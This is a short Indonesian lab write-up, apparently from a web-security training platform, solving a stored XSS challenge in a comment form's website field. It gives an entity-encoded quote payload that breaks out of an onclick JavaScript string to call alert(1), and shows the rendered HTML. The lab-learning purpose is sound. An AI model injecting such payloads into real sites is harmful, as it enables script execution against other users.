# Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Lab ini berisi kerentanan **stored cross-site scripting (XSS)** di fitur komentar.

Untuk menyelesaikan lab ini, kamu harus mengirim komentar yang saat **nama penulis komentar diklik**, akan mengeksekusi fungsi `alert()`.


## Solusi

1. Posting komentar dengan string alfanumerik acak di input **“Website”**.


2. Mengamati bahwa string acak  direfleksikan di dalam atribut event handler **onclick**.

``html
<section class="comment">
<p>
<img src="/resources/images/avatarDefault.svg" class="avatar">
<a id="author" href="https://testing.com" onclick="var tracker={track(){}};tracker.track('https://testing.com');">testing</a> | 16 June 2026
</p>
<p>testing</p>
<p></p>
</section>
```

3. Mengulangi proses yang sama, tetapi kali ini memodifikasi input untuk menyisipkan payload JavaScript URL yang akan memanggil `alert`, menggunakan payload berikut:

```
http://foo?&apos;-alert(1)-&apos;
```

Dan jika kita lihat source code nya akan terlihat seprti ini :

```html
<p>
<img src="/resources/images/avatarDefault.svg" class="avatar">
<a id="author" href="http://foo?'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');">testing</a> | 16 June 2026
</p>
```

5. Memverifikasi teknik tersebut berhasil dengan cara klik kanan, pilih **“Copy URL”**, lalu tempelkan URL tersebut di browser. Saat nama di atas komentar diklik, seharusnya akan memicu alert.
